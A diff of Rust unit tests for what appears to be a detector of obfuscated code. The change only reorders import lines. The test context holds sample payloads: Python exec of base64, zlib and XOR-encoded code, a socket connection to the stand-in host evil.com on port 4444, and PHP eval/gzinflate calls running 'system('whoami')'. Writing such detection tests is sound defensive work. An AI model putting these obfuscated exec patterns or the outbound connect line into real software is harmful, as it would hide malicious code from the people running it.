@@ -45,8 +45,8 @@ exec(base64.b64decode("cHJpbnQoJ2hlbGxvIGZyb20gbWFsd2FyZScp"))
 #[test]
 fn test_python_exec_zlib_b64() {
     // exec(zlib.decompress(base64.b64decode("...")))
-    use flate2::write::ZlibEncoder;
     use flate2::Compression;
+    use flate2::write::ZlibEncoder;
     use std::io::Write;
 
     let payload = b"import os; os.system('whoami')";
@@ -80,8 +80,8 @@ exec(zlib.decompress(base64.b64decode("{encoded}")))
 #[test]
 fn test_python_exec_zlib_b64_xor() {
     // The full tahmin-uygulamasi pattern: base64 → zlib → XOR
-    use flate2::write::ZlibEncoder;
     use flate2::Compression;
+    use flate2::write::ZlibEncoder;
     use std::io::Write;
 
     let payload = b"import socket; socket.connect(('evil.com', 4444))";
@@ -332,8 +332,8 @@ fn test_php_eval_base64_decode() {
 
 #[test]
 fn test_php_eval_gzinflate_base64() {
-    use flate2::write::DeflateEncoder;
     use flate2::Compression;
+    use flate2::write::DeflateEncoder;
     use std::io::Write;
 
     let payload = b"system('whoami');";
